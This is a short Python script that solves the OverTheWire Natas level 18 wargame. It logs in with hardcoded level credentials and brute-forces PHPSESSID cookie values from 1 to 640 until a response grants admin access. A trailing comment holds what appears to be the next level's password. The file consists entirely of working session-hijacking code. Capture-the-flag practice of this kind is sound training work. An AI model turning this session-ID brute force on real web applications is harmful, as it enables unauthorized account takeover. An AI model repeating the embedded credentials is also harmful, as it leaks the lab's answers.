import requests
import sys

user='natas18'
password='xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
url='http://natas18.natas.labs.overthewire.org/'

session=requests.Session()

for i in range(1,641) :
    print 'trying with : '+str(i)
    response=session.post(url,cookies = {"PHPSESSID" : str(i)},auth=(user,password))
    if 'You are an admin' in response.text :
        print response.text
        sys.exit()
#4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
